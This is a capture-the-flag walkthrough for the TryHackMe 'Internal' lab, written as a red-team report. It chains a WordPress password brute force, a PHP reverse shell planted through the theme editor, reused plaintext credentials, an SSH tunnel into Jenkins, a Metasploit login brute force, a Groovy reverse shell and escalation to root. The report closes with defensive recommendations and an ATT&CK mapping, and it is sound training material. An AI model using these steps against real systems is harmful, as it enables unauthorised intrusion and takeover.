# Red Team Engagement Report – Internal Network Compromise

**WordPress → Jenkins → Root Access**

**Author:** Omar Taisir Abu Zahra  
**Lab Name:** Internal  
**Platform:** TryHackMe (Lab Environment)  
**Target:** internal.thm  
**Engagement Type:** Red Team / Adversary Emulation  
**Assessed Difficulty:** Hard  
**Final Outcome:** Root-level access obtained  
**Date:** 08 Jan 2026  

---

## Executive Summary

This engagement simulated a realistic external attack against a publicly exposed web application hosted on **internal.thm**. The attack began with unauthenticated reconnaissance and progressed through credential compromise, internal pivoting, and ultimately full **root-level compromise** of the target system.

The compromise was achieved by chaining multiple security weaknesses rather than exploiting advanced vulnerabilities. These weaknesses included poor credential hygiene, excessive internal service exposure, insecure administrative interfaces, and insufficient privilege separation.

An external attacker with no prior access was able to transition from a public-facing WordPress instance to an internal Jenkins service and finally escalate privileges to root, demonstrating a complete system takeover.

---

## Engagement Scope & Assumptions

**Initial Access:**  
- External  
- Unauthenticated attacker  

**Allowed Techniques:**  
- Credential attacks  
- Application abuse  
- Lateral movement  
- Privilege escalation  

**Restrictions:**  
- None  

**Success Criteria:**  
- Root-level system compromise  

---

## Adversary Tradecraft Overview

### Attack Path Summary

External Reconnaissance
→ Web Application Enumeration
→ Credential Compromise
→ Remote Code Execution
→ Post-Exploitation Enumeration
→ Lateral Movement
→ Internal Service Pivot
→ Jenkins Exploitation
→ Privilege Escalation


This attack path closely mirrors techniques observed in real-world intrusions involving exposed CMS platforms and poorly isolated internal services.

---

## Phase 1 – External Reconnaissance

### Objective
Identify exposed services and define the external attack surface.

### Actions
- Hostname resolution via local mapping
- Active service enumeration

```bash
sudo nano /etc/hosts
<MACHINE_IP> internal.thm

nmap internal.thm -Pn -T4
nmap internal.thm -Pn -T4 -sVC -p 22,80 -oN nmap
Findings
22/tcp – SSH

80/tcp – HTTP
```
## Phase 2 – Web Application Enumeration
Objective
Identify accessible web applications and assess attack vectors.
```bash

gobuster dir -u http://internal.thm/ \
-w /usr/share/wordlists/dirb/common.txt \
-x txt,php -t 60
Findings
/blog endpoint discovered

WordPress CMS identified
```
## Phase 3 – Credential Access (WordPress)
Objective
Obtain valid credentials to gain authenticated access.
```bash

wpscan --url http://internal.thm/blog/ -e u

wpscan --url http://internal.thm/blog/ \
--usernames admin \
--passwords /usr/share/wordlists/rockyou.txt
Result
Valid administrative credentials obtained:

markdown
Copy code
admin : m******s
This provided full administrative access to the WordPress dashboard.
```
## Phase 4 – Initial Foothold (Remote Code Execution)
Objective
Achieve remote command execution on the target host.

The WordPress theme editor was abused to inject a PHP reverse shell.

```bash
rlwrap nc -lnvp 1234
Payload execution:

ruby
Copy code
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
Execution Context
User: www-data
```
## Phase 5 – Post-Exploitation Enumeration
Objective
Enumerate the system for credentials and pivot paths.

```bash
id
cd /opt
ls
cat wp-save.txt
Recovered Credentials
markdown
Copy code
aubreanna : bub********123
Plaintext credentials enabled further access.
```
## Phase 6 – Lateral Movement
Objective
Move from web shell to stable user access.

```bash
ssh aubreanna@internal.thm
whoami
Successful SSH access improved stability and control.
```
## Phase 7 – Internal Pivot (Jenkins)

Objective
Access internal-only services.

```bash

cat jenkins.txt
ssh -L 8080:localhost:8080 aubreanna@internal.thm
Service accessed via:

http://localhost:8080

```
## Phase 8 – Internal Service Exploitation (Jenkins)
Objective
Achieve command execution via Jenkins.

```bash
msfconsole
search jenkins
use 19
set RHOSTS localhost
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
exploit
Administrative Jenkins access obtained.

A Groovy reverse shell was executed via the Jenkins Script Console.


rlwrap nc -lnvp 443
```
## Phase 9 – Privilege Escalation
Objective
Escalate privileges to root.

```bash
cd /opt
ls
cat note.txt
su
Root Validation
cd /root
ls -la
cat root.txt
Root access successfully achieved.
```
## Impact Assessment
Phase	Impact
External Reconnaissance	Attack surface identified
Credential Access	WordPress admin compromise
Initial Foothold	Remote code execution
Lateral Movement	SSH user access
Internal Pivot	Jenkins compromise
Privilege Escalation	Full root access

## Defensive Recommendations
Enforce strong password policies and MFA

Disable WordPress theme and plugin editors

Eliminate plaintext credential storage

Restrict internal services with firewall rules

Harden Jenkins authentication and permissions

Apply least-privilege principles across all services

## MITRE ATT&CK Mapping
Tactic	Technique	ID
Reconnaissance	Active Scanning	T1595
Credential Access	Brute Force	T1110
Credential Access	Valid Accounts	T1078
Execution	Command and Scripting Interpreter	T1059
Lateral Movement	Remote Services (SSH)	T1021
Discovery	Network Service Discovery	T1046
Privilege Escalation	Exploitation for Privilege Escalation	T1068

## Conclusion
This engagement demonstrates how an exposed web application combined with weak credentials and poor internal segmentation can lead to full system compromise.

No advanced exploits or zero-day vulnerabilities were required. Instead, the attack relied on common misconfigurations and operational security failures, emphasizing the importance of secure defaults, credential hygiene, and proper service isolation.
